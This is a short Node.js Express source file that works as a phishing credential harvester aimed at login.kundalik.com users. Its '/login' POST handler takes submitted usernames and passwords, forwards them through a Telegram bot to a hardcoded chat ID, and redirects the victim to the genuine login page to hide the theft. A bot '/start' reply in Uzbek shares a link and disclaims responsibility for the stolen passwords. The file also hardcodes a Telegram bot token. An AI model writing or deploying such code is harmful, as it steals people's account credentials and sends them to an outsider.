const express = require('express')
const app = express()
const ejs = require('ejs')
const path = require('path')
const PORT = process.env.PORT || 9000

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

app.use(express.static(__dirname + '/public'));
app.use(express.urlencoded({ extended: true }))


const TelegramBot = require('node-telegram-bot-api');
const TOKEN = '5476164297:AAGHkdtunFcA0U_c-Y8Zyjem1_QudwRuCvQ';

const bot = new TelegramBot(TOKEN, {
	polling: true,
});

const router = express.Router()

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id
    bot.sendMessage(chatId, 'Link: https://ajibuji \n Eslatma: Parol noto`g`ri bo`lishi yokida boshqa odamniki bo`lishi mumkin. Bu borada dasturchi javob bermaydi')
})

router.post('/login', (req, res)=> {
    const { name, password } = req.body
    
    bot.sendMessage(1209738128, `name: ${name + ' password: ' + password}`)
    res.redirect('https://login.kundalik.com/login')
})


app.use(router)
app.get('/', (_, res)=>{
    res.send('ok')
})


app.use('/login', (req, res)=> {
    res.render('index')
})

app.listen(PORT, console.log(PORT))